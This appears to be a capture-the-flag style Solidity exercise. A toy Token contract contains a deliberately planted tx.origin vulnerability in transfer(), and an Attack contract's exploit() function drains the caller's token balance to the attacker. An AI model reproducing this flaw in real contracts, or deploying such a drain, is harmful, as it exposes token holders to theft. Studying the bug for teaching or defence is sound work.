// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract Token {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) allowances;

    constructor() {
        balances[msg.sender] = 1000;
    }

    function balanceOf(address _addr) external view returns (uint) {
        return balances[_addr];
    }

    function transfer(address _recipient, uint _amount) external {
        balances[_recipient] += _amount;
        // balances[msg.sender] -= _amount;
        // rune exploit challenge
        balances[tx.origin] -= _amount;
    }

    function approve(address _spender, uint _amount) external {
        allowances[msg.sender][_spender] = _amount;
    }

    function transferFrom(address _owner, uint _amount) external {
        require(allowances[_owner][msg.sender] >= _amount);
        allowances[_owner][msg.sender] -= _amount;
        balances[msg.sender] += _amount;
        balances[_owner] -= _amount;
    }
}

contract Protocol {
    mapping(address => uint) public balances;

    function deposit(address _token, uint _amount) external {
        Token(_token).transferFrom(msg.sender, _amount);
        balances[msg.sender] += _amount;
    }
}

contract Attack {
    address public owner;
    Token token;

    constructor(Token _token) {
        token = Token(_token);
        owner = payable(msg.sender);
    }

    function exploit() public {
        token.transfer((owner), token.balanceOf(msg.sender));
    }
}
